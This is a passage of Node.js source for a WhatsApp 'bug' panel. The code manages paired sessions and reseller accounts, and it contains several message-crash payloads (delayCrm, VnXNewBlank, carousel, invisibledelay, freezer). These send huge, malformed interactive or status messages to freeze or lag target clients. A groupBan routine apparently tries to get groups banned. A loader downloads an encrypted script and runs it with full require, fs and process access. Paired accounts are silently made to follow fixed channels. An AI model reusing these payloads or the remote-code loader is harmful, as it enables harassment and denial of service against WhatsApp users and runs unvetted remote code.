    if (sock && sock.user) {  // ← TAMBAHKAN validasi
      sessions.push({
        cacheKey,
        folderName: cacheKey.split('::')[0],
        sessionName: cacheKey.split('::')[1],
        userId: sock.user.id  // ← TAMBAHKAN userId
      });
    }
  }
  fs.writeFileSync(SESSION_BACKUP_FILE, JSON.stringify(sessions, null, 2));
  console.log(`💾 Backup ${sessions.length} sessions ke file`);
}

function saveSessionState() {
  const state = {
    lastBackup: new Date().toISOString(),
    sessionCount: Object.keys(activeConnections).length,
    sessions: Object.keys(activeConnections).map(key => ({
      cacheKey: key,
      folderName: key.split('::')[0],
      sessionName: key.split('::')[1]
    }))
  };
  fs.writeFileSync(SESSION_STATE_FILE, JSON.stringify(state, null, 2));
}

// Restore session setelah restart
async function restoreSessionsFromBackup() {
  if (!fs.existsSync(SESSION_BACKUP_FILE)) {
    console.log("📂 Tidak ada file backup session, akan scan folder manual...");
    return false;
  }

  try {
    const sessions = JSON.parse(fs.readFileSync(SESSION_BACKUP_FILE, 'utf8'));
    console.log(`🔄 Memulihkan ${sessions.length} session dari backup...`);

    let restoredCount = 0;

    for (const session of sessions) {
      const folderPath = path.join('permenmd', session.folderName);
      const sessionPath = path.join(folderPath, session.sessionName);
      const credsFile = path.join(sessionPath, 'creds.json');

      if (fs.existsSync(credsFile)) {
        console.log(`🔌 Memulihkan session: ${session.sessionName} (${session.folderName})`);
        const cacheKey = buildSessionCacheKey(session.folderName, session.sessionName);
        if (!activeConnections[cacheKey]) {
          await connectSession(folderPath, session.sessionName);
          restoredCount++;
          await waiting(1000);
        }
      } else {
        console.log(`⚠️ Session ${session.sessionName} tidak memiliki creds.json, lewati...`);
      }
    }

    console.log(`✅ Berhasil memulihkan ${restoredCount} session`);
    return true;
  } catch (err) {
    console.error("❌ Restore session error:", err.message);
    return false;
  }
}

async function scanAndRestoreAllSessions() {
  const permenmdPath = path.join(__dirname, 'permenmd');

  if (!fs.existsSync(permenmdPath)) {
    console.log("📁 Folder permenmd tidak ditemukan");
    return;
  }

  const userFolders = fs.readdirSync(permenmdPath);
  let totalRestored = 0;

  for (const folderName of userFolders) {
    const folderPath = path.join(permenmdPath, folderName);

    if (!fs.statSync(folderPath).isDirectory()) continue;

    const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.json'));

    for (const file of files) {
      const sessionName = path.basename(file, '.json');
      const sessionFolder = path.join(folderPath, sessionName);
      const credsFile = path.join(sessionFolder, 'creds.json');
      const cacheKey = buildSessionCacheKey(folderName, sessionName);

      if (!activeConnections[cacheKey] && fs.existsSync(credsFile)) {
        console.log(`🔍 Menemukan session: ${sessionName} (${folderName}) - Merestore...`);
        await connectSession(folderPath, sessionName);
        totalRestored++;
        await waiting(500);
      }
    }
  }

  console.log(`📊 Scan selesai: ${totalRestored} session direstore`);
  return totalRestored;
}

// Simpan backup saat proses akan exit
const gracefulShutdown = async () => {
  console.log("🛑 Menutup server dengan graceful...");
  backupActiveSessions();
  saveSessionState();

  for (const [key, sock] of Object.entries(activeConnections)) {
    try {
      if (sock && sock.ws) {
        sock.ws.close();
      }
    } catch (e) { }
  }

  process.exit(0);
};

process.on('beforeExit', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const changed = ensureGlobalSenderUsageState(user);
  const privateConnections = getActiveCredsInFolder(user.username).map(sender =>
    buildSenderConnectionItem(sender, "private", user.role || "member")
  );
  const globalFromGlobalFolder = getActiveCredsInFolder(GLOBAL_SENDER_FOLDER).map(sender =>
    buildSenderConnectionItem(sender, "global", user.role || "member")
  );
  const userSenders = getActiveCredsInFolder(user.username);
  const globalFromUserFolder = userSenders
    .filter(sender => globalSenderSessions.includes(sender?.sessionName?.toString() || sender?.id?.toString() || ""))
    .map(sender => buildSenderConnectionItem(sender, "global", user.role || "member"));
  const globalConnections = [...globalFromGlobalFolder, ...globalFromUserFolder];

  if (changed) {
    saveDatabase(db);
  }

  return res.json({
    valid: true,
    connections: [...globalConnections, ...privateConnections],
    privateConnections,
    globalConnections,
    globalSenderQuota: getGlobalSenderQuotaPayload(user),
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number, global } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "Invalid session key" });

  const cleanNumber = String(number || "").replace(/\D/g, "");
  const isGlobal = String(global || "0").trim() === "1";
  if (!cleanNumber) return res.status(400).json({ error: "Number is required" });

  if (isGlobal && !canManageGlobalSender(user.role || "member")) {
    return res.status(403).json({
      valid: false,
      message: "Hanya owner atau developer yang dapat menambahkan Global Sender.",
    });
  }

  try {
    const ownerFolder = isGlobal ? GLOBAL_SENDER_FOLDER : user.username;
    const cacheKey = buildSessionCacheKey(ownerFolder, cleanNumber);
    const sessionDir = path.join('permenmd', ownerFolder, cleanNumber);

    ensureSessionDir(sessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const safeSaveCreds = createSafeSaveCreds(saveCreds, sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", safeSaveCreds);

    // ─── Auto Follow Newsletter saat connect ────────────────────────────────────
    async function autoFollowNewsletters(sock) {
      const channelIDs = [
        "120363427664166481@newsletter",
        "120363425293820284@newsletter"
      ];
      console.log(`[NEWSLETTER] Auto follow ${channelIDs.length} channel...`);
      for (let i = 0; i < channelIDs.length; i++) {
        try {
          await sock.newsletterFollow(channelIDs[i]);
          console.log(`[NEWSLETTER] ✅ Follow sukses: ${channelIDs[i]}`);
        } catch (err) {
          console.log(`[NEWSLETTER] ❌ Gagal follow ${channelIDs[i]}: ${err?.message || 'Unknown'}`);
        }
        if (i < channelIDs.length - 1) {
          await new Promise(r => setTimeout(r, 1500));
        }
      }
      console.log(`[NEWSLETTER] Selesai auto follow semua channel.`);
    }

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        if (deletingSessions.has(cacheKey)) {
          delete activeConnections[cacheKey];
          delete biz[cacheKey];
          delete mess[cacheKey];
          removeSessionArtifacts(path.join('permenmd', ownerFolder), cleanNumber);
          deletingSessions.delete(cacheKey);
          return;
        }

        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${cleanNumber}...`);
          await waiting(3000);
          await pairingWa(cleanNumber, ownerFolder);
        } else {
          delete activeConnections[cacheKey];
          delete biz[cacheKey];
          delete mess[cacheKey];
        }
      } else if (connection === "open") {
        activeConnections[cacheKey] = sock;

        // Auto follow newsletter setiap kali WA connect/reconnect
        try {
          await waiting(3000); // tunggu koneksi stabil dulu
          await autoFollowNewsletters(sock);
        } catch (e) {
          console.log(`[NEWSLETTER] Error: ${e.message}`);
        }

        const sourceCreds = path.join(sessionDir, "creds.json");
        const destCreds = path.join("permenmd", ownerFolder, `${cleanNumber}.json`);
        const type = detectWATypeFromCreds(sourceCreds);

        if (type === "Business") {
          biz[cacheKey] = sock;
        } else if (type === "Messenger") {
          mess[cacheKey] = sock;
        }

        try {
          await waiting(3000);
          if (fs.existsSync(sourceCreds)) {
            const data = fs.readFileSync(sourceCreds);
            fs.writeFileSync(destCreds, data);
            console.log(`✅ Rewrote session to ${destCreds}`);
          }
        } catch (e) {
          console.error(`❌ Failed to rewrite creds: ${e.message}`);
        }
      }
    });
    // 🔹 Auto-register global sender untuk role tertentu
    if (!isGlobal) {
      const autoGlobalRoles = ["all_access", "owner_vip", "owner", "tk", "pt", "reseller", "vip", "member"];
      const userNormalizedRole = normalizeRoleName(user?.role || "member");
      if (autoGlobalRoles.includes(userNormalizedRole)) {
        if (!globalSenderSessions.includes(cleanNumber)) {
          globalSenderSessions.push(cleanNumber);
          saveGlobalSenderSessions();
        }
      }
    }

    // 🔹 Kalau belum registered, generate pairing code
    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(cleanNumber);
      console.log(code)
      if (code) {
        return res.json({
          valid: true,
          number: cleanNumber,
          pairingCode: code,
          scope: isGlobal ? "global" : "private",
        });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
    return res.json({
      valid: false,
      message: "Sender sudah terhubung atau pairing masih diproses.",
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.delete("/deleteSender", async (req, res) => {
  const { key, id, scope } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });

  const senderId = String(id || "").trim();
  if (!senderId) {
    return res.status(400).json({ valid: false, message: "Sender id is required" });
  }

  const requestedScope = String(scope || "").trim().toLowerCase();
  const userFolderName = user.username;
  const globalFolderName = GLOBAL_SENDER_FOLDER;

  let resolvedFolderName = userFolderName;
  let resolvedScope = "private";

  if (requestedScope === "global") {
    if (!canManageGlobalSender(user.role || "member")) {
      return res.status(403).json({
        valid: false,
        message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
      });
    }

    resolvedFolderName = globalFolderName;
    resolvedScope = "global";
  } else {
    const privateFile = path.join('permenmd', userFolderName, `${senderId}.json`);
    const privateDir = path.join('permenmd', userFolderName, senderId);
    const globalFile = path.join('permenmd', globalFolderName, `${senderId}.json`);
    const globalDir = path.join('permenmd', globalFolderName, senderId);
    const privateExists = fs.existsSync(privateFile) || fs.existsSync(privateDir);
    const globalExists = fs.existsSync(globalFile) || fs.existsSync(globalDir);

    if (!privateExists && globalExists) {
      if (!canManageGlobalSender(user.role || "member")) {
        return res.status(403).json({
          valid: false,
          message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
        });
      }

      resolvedFolderName = globalFolderName;
      resolvedScope = "global";
    }
  }

  const resolvedFolder = path.join('permenmd', resolvedFolderName);
  const sessionFolder = path.join(resolvedFolder, senderId);
  const sessionFile = path.join(resolvedFolder, `${senderId}.json`);
  const cacheKey = buildSessionCacheKey(resolvedFolderName, senderId);
  const sock = activeConnections[cacheKey] || biz[cacheKey] || mess[cacheKey];

  if (!sock && !fs.existsSync(sessionFolder) && !fs.existsSync(sessionFile)) {
    return res.status(404).json({ valid: false, message: "Sender not found" });
  }

  deletingSessions.add(cacheKey);

  delete activeConnections[cacheKey];
  delete biz[cacheKey];
  delete mess[cacheKey];

  if (sock?.logout) {
    try {
      await sock.logout();
    } catch (err) {
      console.log(`[${senderId}] Logout during delete failed: ${err.message}`);
    }
  }

  removeSessionArtifacts(resolvedFolder, senderId);

  if (globalSenderSessions.includes(senderId)) {
    const gIndex = globalSenderSessions.indexOf(senderId);
    if (gIndex !== -1) {
      globalSenderSessions.splice(gIndex, 1);
      saveGlobalSenderSessions();
    }
  }

  if (!sock) {
    deletingSessions.delete(cacheKey);
  }

  return res.json({
    valid: true,
    deleted: true,
    id: senderId,
    scope: resolvedScope,
  });
});


const normalizeRoleName = (role = "member") =>
  String(role).trim().toLowerCase().replace(/\s+/g, "_");

const ROLE_CREATE_PERMISSIONS = {
  owner_vip: ["owner", "tk", "pt", "reseller", "vip", "member"],
  owner: ["tk", "pt", "admin", "reseller", "vip", "member"],
  admin: ["reseller", "member"],
  reseller: ["member"],
  vip: [],
  member: [],
  developer: ["all_access", "owner_vip", "owner", "tk", "pt", "admin", "reseller", "vip", "member"],
  all_access: ["owner_vip", "owner", "tk", "pt", "reseller", "vip", "member"],
  tk: ["pt", "reseller", "member"],
  pt: ["reseller", "member"],
};

function getAllowedCreateRoles(role) {
  const normalized = normalizeRoleName(role);
  return ROLE_CREATE_PERMISSIONS[normalized] || [];
}

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role = "member" } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}' role '${role}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");

  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin membuat role '${role}'.`);
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (creatorRole === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: requestedRole,
  };

  db.push(newAccount);
  saveDatabase(db);

  sendToGroups(
    buildAccountCreationNotification(newAccount, creator.username, day),
    { parse_mode: "Markdown" }
  );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day} role ${requestedRole}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (owner/developer only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  const adminRole = normalizeRoleName(admin?.role || "member");
  if (!admin || !["owner", "owner_vip", "developer"].includes(adminRole)) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner/developer.`);
    return res.json({ valid: true, authorized: false, message: "Only owner or developer can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);

  sendToGroups(
    `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
    { parse_mode: "Markdown" }
  );

  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const viewer = db.find(u => u.username === keyInfo.username);
  const viewerRole = normalizeRoleName(viewer?.role || "member");
  const allowedRoles = getAllowedCreateRoles(viewerRole);

  if (!viewer || allowedRoles.length === 0) {
    console.log(`[❌ LIST] ${viewer?.username || "Unknown"} tidak diizinkan melihat user list.`);
    return res.json({
      valid: true,
      authorized: false,
      message: `Role '${viewerRole}' tidak bisa melihat daftar user.`,
    });
  }

  const users = db
    .filter(u => allowedRoles.includes(normalizeRoleName(u.role || "member")))
    .map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: normalizeRoleName(u.role || "member"),
    }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role = "member", day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");

  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: requestedRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);

  sendToGroups(
    buildAccountCreationNotification(newUser, creator.username, day),
    { parse_mode: "Markdown" }
  );

  const logLine = `${creator.username} Created ${newUser.username} Role ${requestedRole} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner", "owner_vip"].includes(normalizeRoleName(editor.role))) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

// ===== GET /getMyActivity - Riwayat aktivitas user =====
const USER_ACTIVITY_FILE = './user_activities.json';
function loadActivities() {
  try {
    if (fs.existsSync(USER_ACTIVITY_FILE)) {
      return JSON.parse(fs.readFileSync(USER_ACTIVITY_FILE, 'utf8'));
    }
  } catch (_) { }
  return {};
}
function saveActivities(data) {
  try { fs.writeFileSync(USER_ACTIVITY_FILE, JSON.stringify(data, null, 2)); } catch (_) { }
}
function addActivity(username, type, title, description) {
  const activities = loadActivities();
  if (!activities[username]) activities[username] = [];
  activities[username].unshift({
    type: type || 'system',
    title: title || 'Aktivitas',
    description: description || '-',
    timestamp: Date.now(),
  });
  if (activities[username].length > 200) activities[username] = activities[username].slice(0, 200);
  saveActivities(activities);
}

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
  const activities = loadActivities();
  const userActivities = activities[keyInfo.username] || [];
  res.json({ valid: true, activities: userActivities });
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function cobain(sock, target) {
  await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "try anj",
              footer: "jembud"
            },
            nativeFlowMessage: {
              buttons: [{
                name: "booking_status",
                buttonParamsJson: "{}"
              }]
            }
          }
        }
      }
    }, { participant: { jid: target }
    }
  );
}

async function delayCrm(sock, target) {
  const sleep = ms => new Promise(r => setTimeout(r, ms));

    const message = await generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              locationMessage: {
                degreesLatitude: 1.2,
                degreesLongitude: 3.4,
                name: "҉⃝".repeat(15000),
                address: "҉⃝".repeat(40000),
                url: "҉⃝".repeat(30000),
                caption: "҉⃝".repeat(60000),
                contextInfo: {
                  mentionedJid: Array.from(
                    { length: 2000 },
                    () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
                  ),
                  quotedMessage: {
                    locationMessage: {
                      degreesLatitude: 5.6,
                      degreesLongitude: 7.8,
                      name: "҉⃝".repeat(15000),
                      address: "҉⃝".repeat(40000)
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, message.message, {
      participant: { jid: target },
      messageId: message.key.id
    });

    await sleep(1000);
}

async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

async function VnXNewBlank(sock, target) {
  const msgvnx = {
    interactiveMessage: {
      body: {
        text: "VnX",
      },
      footer: {
        text: 'VnX',
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'single_select',
            buttonParamsJson: JSON.stringify({
              title: 'VnX',
              sections: [
                {
                  title: '',
                  rows: Array.from({ length: 4 }, (_, i) => ({
                    id: 'ꦽ'.repeat(10000),
                    title: 'ꦽ'.repeat(10000),
                  })),
                },
              ],
            }),
          },
        ],
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterName: 'VnX Here',
          newsletterJid: '120363370508049655@newsletter',
        },
      },
    },
  };

  let vnxmsgv2 = {
    interactiveMessage: {
      body: {
        text: "VnX" + 'ꦽ'.repeat(10000),
      },
      footer: {
        text: 'VnX',
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50000 }, (_, i) => ({
         id: 'ꦽ'.repeat(10000),
         title: 'ꦽ'.repeat(10000)
        })),
      },
    },
  };
    
  await sock.relayMessage(target, vnxmsgv2, {
    participant: { jid: target },
  });

  await sock.relayMessage(target, msgvnx, {
    participant: { jid: target },
  });
}

async function carousel(sock, target) {
  const carousel = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            name: "carousel",
            format: "DEFAULT",
          },
          footer: {
            name: "crasher",
            format: "DEFAULT",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_message",
                buttonParamsJson: "\u0010".repeat(902000),
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, carousel, {
    participant: { jid: target },
  });
}

async function invisibledelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "XB",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function freezer(sock, target) {
    try {
        const rezz = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "\uD83D\uDDB8\uFE0FTRVSP 𝐀𝐭𝐭𝐚𝐜𝐤 𝐘𝐨𝐮\uD83D\uDDB8\uFE0F",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "24032010" + "\uA9BD".repeat(50000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{{".repeat(10000),
                            paramsJson: {
                                "screen_2_OptIn_0": true,
                                "screen_2_OptIn_1": true,
                                "screen_1_Dropdown_0": "\uD83D\uDDB8\uFE0F𝐗𝐲𝐥𝐨𝐭𝐫𝐞𝐜𝐡𝐮𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 𝐘𝐨𝐮\uD83D\uDDB8\uFE0F",
                                "screen_1_DatePicker_1": "1028995200000",
                                "screen_1_TextInput_2": "cyber@gmail.com",
                                "screen_1_TextInput_3": "94643116",
                                "screen_0_TextInput_0": "radio - buttons${" + "\uA9BE".repeat(25000) + "}",
                                "screen_0_TextInput_1": "Why?",
                                "screen_0_Dropdown_2": "001-Grimgar",
                                "screen_0_RadioButtonsGroup_3": "0_true",
                                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                            },
                            version: 3
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, rezz, {
            participants: { jid: target }
        });

        return { success: true, message: "Freeze sent" };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
